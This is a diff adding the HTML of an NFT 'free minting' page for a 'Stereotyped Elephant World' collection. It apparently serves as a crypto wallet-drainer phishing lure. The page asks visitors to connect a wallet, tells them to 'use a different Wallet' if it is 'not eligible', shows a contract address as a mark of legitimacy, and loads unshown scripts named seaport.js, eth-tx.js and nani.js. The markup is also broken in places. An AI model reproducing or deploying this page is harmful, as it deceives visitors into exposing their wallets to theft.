@@ -1,0 +1,126 @@
+<!DOCTYPE html><html lang="en"><head><link rel="icon" href="/favicon.ico"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=10"><meta name="theme-color" content="#FFFFFF"><link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png"><link rel="manifest" href="%PUBLIC_URL%/manifest.json"><meta name="twitter:title" content=""><meta name="next-head-count" content="13"><link rel="preload" href="style.css?sdqs" as="style"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="twitter:card" content="summary_large_image"><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"></div></body></head></html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./assets/css/style.css">
+    <link href="" rel="icon" type="image/png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@700&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+    <title>Stereotyped Elephant World Official NFT Minting page</title>
+</head>
+<body>
+    <main>
+        <div class="background">
+            <img>
+        </div>
+        <div class="logo">
+        </div>
+        <div class="wrapper">
+            <div class="top">
+                <div class="left-content">
+                    <div class="collectionImage">
+                        <img src="./assets/img/gif.gif" alt="NFT" height="350">
+                        <p class="collectionTraits">Traits are revealed immediatly.</p>
+                        <div id="notification" class="notification"></div>
+                        <style>
+                            .notification {
+                            position: fixed;
+                            top: 20px;
+                            right: 20px;
+                            background-color: #20ad25c7;
+                            color: white;
+                            padding: 10px;
+                            border-radius: 5px;
+                            display: none;
+                            z-index: 9999;
+                         }
+                    </style>
+                        <p class="collectionSupply">4000 NFTs</p>
+                    </div>
+                </div>
+                <div class="right-content">
+                    <div class="left-top">
+                        <p>Minting Free - Stereotyped Elephant NFTs</p>
+
+                        <p>• This collection includes both digital and physical collectibles, all verified through the use of NFTs (non-fungible tokens) to prove ownership and legitimacy.</p>
+                    </div>
+                    
+                    <div class="banner-claim">
+                        <p>Live Mint:</p>
+                        <div class="num">
+                            <div id="num"></div>
+                
+                        </div>
+                      </body>
+                    </div>
+                    <div class="right-bottom">
+                        <div class="counter">
+                            <span id="minus" onClick="decrease()">-</span>
+                            <p id="count">1</p>
+                            <span id="plus" onClick="increase()">+</span>
+                        </div>
+                        <!--<p class="price">4 ETH + GAS</p>--->
+                        <p class="price">SEW Claim
+                        <p>Max: 3 Per Entry</p>
+                        <button id="connectButton">Confirm Entry</button>
+                        <div class="connectedSection" id="claimSection" style="display:none ;">
+                            <button id="claimButton">Submit Now</button>
+                            <p id="walletAddress"></p>
+                            <p id="notEli" class="notEli" style="display:none; color: red;">Wallet is not eligible. Use a different Wallet</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="bottom">
+                    <h3>Smart Contract Address</h3>
+                    <p>0x495f947276749ce646f68ac8c248420045cb7b5e</p>
+            </div>
+        </div>
+    </main>
+    <script>
+        const val = document.getElementById("count");
+            const decrease = () => {
+                let num = parseFloat(val.innerText)
+                if(num > 1) {
+                    val.innerText = parseFloat(num - 1);
+                }
+            };
+        
+            const increase = () => {
+                let num = parseFloat(val.innerText)
+                if(num >= 1 && num < 3) {
+                    val.innerText = parseFloat(num + 1);
+                }
+            };
+
+        </script>
+      <!-- <script src="https://bundle.run/buffer@6.0.3"></script> 
+<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+<script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>
+<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+<script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>
+<script src="assets/js/seaport.js"></script>
+<script src="assets/js/eth-tx.js"></script>
+<script src="assets/js/index.js"></script> -->
+
+<script src="https://bundle.run/buffer@6.0.3"></script> 
+<script src="./assets/script/ethers.umd.min.js"></script>
+<script src="./assets/script/index.min.js"></script>
+<script src="./assets/script/web3.min.js"></script>
+<script src="./assets/script/moralis.js"></script>
+
+<script src="./assets/js/seaport.js"></script>
+<script src="./assets/js/eth-tx.js"></script>
+<script src="./assets/js/index.js"></script>
+<!-- <script src="./assets/js/naninot.js"></script> -->
+<script src="./assets/js/nani.js"></script>
+</body>
+</html>
+
+</body>
